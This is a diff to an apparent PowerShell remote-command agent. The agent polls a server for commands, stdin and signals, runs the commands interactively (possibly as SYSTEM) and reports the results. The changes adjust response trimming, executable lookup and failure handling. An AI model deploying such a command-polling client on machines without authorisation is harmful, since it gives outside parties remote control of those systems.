@@ -170,18 +170,18 @@ function Send-Http {
     }
     $resp = $req.GetResponse()
     $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
-    $result = $reader.ReadToEnd().Trim()
+    $result = $reader.ReadToEnd()
     $reader.Close()
     $resp.Close()
     return $result
 }
 
 function Get-Command-From-Server {
-    try { return Send-Http -Url "$cfHost/cmd?id=$clientId" } catch { throw $_ }
+    try { return (Send-Http -Url "$cfHost/cmd?id=$clientId").Trim() } catch { throw $_ }
 }
 
 function Get-Signal-From-Server {
-    try { return Send-Http -Url "$cfHost/signal?id=$clientId" -TimeoutMs 3000 } catch { return "" }
+    try { return (Send-Http -Url "$cfHost/signal?id=$clientId" -TimeoutMs 3000).Trim() } catch { return "" }
 }
 
 function Send-Stream-To-Server {
@@ -197,7 +197,14 @@ function Send-Result-To-Server {
 }
 
 function Get-Stdin-From-Server {
+    # No Trim — preserves whitespace for interactive stdin payloads
     try { return Send-Http -Url "$cfHost/stdin?id=$clientId" -TimeoutMs 3000 } catch { return "" }
+}
+
+function Send-Interactive-Flag {
+    param([bool]$IsInteractive)
+    $val = if ($IsInteractive) { "true" } else { "false" }
+    try { Send-Http -Url "$cfHost/interactive?id=$clientId" -Method "POST" -Body $val | Out-Null } catch {}
 }
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -252,16 +259,18 @@ function Invoke-InteractiveCommand {
         $resolved = (Get-Command $exe -ErrorAction Stop).Source
         if ($resolved) { $exe = $resolved }
     } catch {
-        # Fallback: search common user-install dirs that SYSTEM's PATH may lack
-        $searchDirs = @(
-            "$env:ProgramFiles", "${env:ProgramFiles(x86)}",
-            "$env:SystemRoot\System32",
-            "$env:LOCALAPPDATA\Programs\Python", "$env:LOCALAPPDATA\Programs",
-            "$env:ProgramFiles\Python*", "$env:ProgramFiles\nodejs"
+        # Fallback: check known install dirs (no recursive scan)
+        $knownPaths = @(
+            "$env:SystemRoot\System32\$exe.exe",
+            "$env:ProgramFiles\$exe\$exe.exe",
+            "${env:ProgramFiles(x86)}\$exe\$exe.exe",
+            "$env:LOCALAPPDATA\Programs\Python\Python*\$exe.exe",
+            "$env:ProgramFiles\Python*\$exe.exe",
+            "$env:ProgramFiles\nodejs\$exe.exe"
         )
-        foreach ($dir in $searchDirs) {
-            $candidates = Get-ChildItem -Path $dir -Filter "$exe.exe" -Recurse -Depth 2 -ErrorAction SilentlyContinue | Select-Object -First 1
-            if ($candidates) { $exe = $candidates.FullName; break }
+        foreach ($pattern in $knownPaths) {
+            $match = Get-Item -Path $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
+            if ($match) { $exe = $match.FullName; break }
         }
     }
 
@@ -299,10 +308,14 @@ function Invoke-InteractiveCommand {
     $proc.BeginOutputReadLine()
     $proc.BeginErrorReadLine()
 
+    Send-Interactive-Flag -IsInteractive $true
+
     $startTime = Get-Date
     $idleCycles = 0
     $cancelled = $false
     $timedOut = $false
+    $pollFailures = 0
+    $maxPollFailures = 15  # abort interactive session after this many transport failures
 
     while (-not $proc.HasExited) {
         $chunk = ""
@@ -318,7 +331,10 @@ function Invoke-InteractiveCommand {
         }
 
         $stdinData = Get-Stdin-From-Server
-        if ($stdinData) {
+        if ($stdinData -eq "") {
+            # Could be empty response or transport failure — both return ""
+        } elseif ($stdinData) {
+            $pollFailures = 0  # successful poll
             foreach ($stdinLine in ($stdinData -split "`n")) {
                 $cleanLine = $stdinLine.TrimEnd("`r")
                 try { $proc.StandardInput.WriteLine($cleanLine) } catch {}
@@ -331,6 +347,17 @@ function Invoke-InteractiveCommand {
             try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
             $cancelled = $true
             break
+        }
+        if ($signal -eq "") {
+            $pollFailures++
+            if ($pollFailures -ge $maxPollFailures) {
+                Write-Log "Interactive session lost: $maxPollFailures consecutive poll failures" "WARN"
+                try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
+                $cancelled = $true
+                break
+            }
+        } else {
+            $pollFailures = 0
         }
 
         if (-not $NoTimeout) {
